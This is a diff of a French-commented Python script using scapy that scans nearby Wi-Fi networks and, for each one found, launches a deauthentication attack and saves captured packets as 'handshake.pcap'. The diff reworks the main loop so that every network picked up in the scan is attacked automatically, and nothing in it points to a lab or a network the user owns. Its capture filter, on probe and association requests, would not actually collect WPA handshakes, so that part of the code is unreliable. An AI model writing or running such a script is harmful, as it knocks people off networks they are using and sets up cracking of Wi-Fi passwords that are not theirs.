@@ -11,7 +11,7 @@ interface = "wlan1"  # Remplacez par votre interface réseau Wi-Fi
 
 def scan_wifi():
     logging.info("Début du scan des réseaux Wi-Fi...")
-    packets = sniff(iface=interface, count=100, timeout=10)
+    packets = sniff(iface=interface, count=0, timeout=10)  # Scan de 10 secondes
 
     networks = []
     for packet in packets:
@@ -24,19 +24,13 @@ def scan_wifi():
                     break
             networks.append((mac_address, ssid))
 
-    with open("networks.txt", "w") as f:
-        for network in networks:
-            f.write(f"{network[0]} - {network[1]}\n")
-
     logging.info("Scan des réseaux Wi-Fi terminé.")
     return networks
 
 def capture_handshake(ap_address):
     logging.info(f"Capture du handshake pour {ap_address}...")
-    # Sniffer pour capturer le handshake
     packets = sniff(iface=interface, filter="type mgt subtype probe-req or type mgt subtype assoc-req", count=10, timeout=30)
     
-    # Sauvegarder le handshake dans un fichier
     with open("handshake.pcap", "wb") as f:
         wrpcap(f, packets)
 
@@ -54,13 +48,10 @@ if __name__ == "__main__":
     networks = scan_wifi()
     attacked_networks = set()  # Ensemble pour suivre les réseaux déjà attaqués
 
-    with open("networks.txt", "r") as f:
-        for line in f:
-            mac_address = line.split(" - ")[0]
-
-            # Vérifier si l'adresse MAC a déjà été attaquée
-            if mac_address not in attacked_networks:
-                logging.info(f"Démarrage de l'attaque de désauthentification sur {mac_address}")
-                deauth_attack(mac_address)
-                capture_handshake(mac_address)  # Capturer le handshake
-                attacked_networks.add(mac_address)  # Ajouter à l'ensemble des réseaux attaqués
+    for mac_address, ssid in networks:
+        # Vérifier si l'adresse MAC a déjà été attaquée
+        if mac_address not in attacked_networks:
+            logging.info(f"Démarrage de l'attaque de désauthentification sur {mac_address} ({ssid})")
+            deauth_attack(mac_address)
+            capture_handshake(mac_address)  # Capturer le handshake
+            attacked_networks.add(mac_address)  # Ajouter à l'ensemble des réseaux attaqués
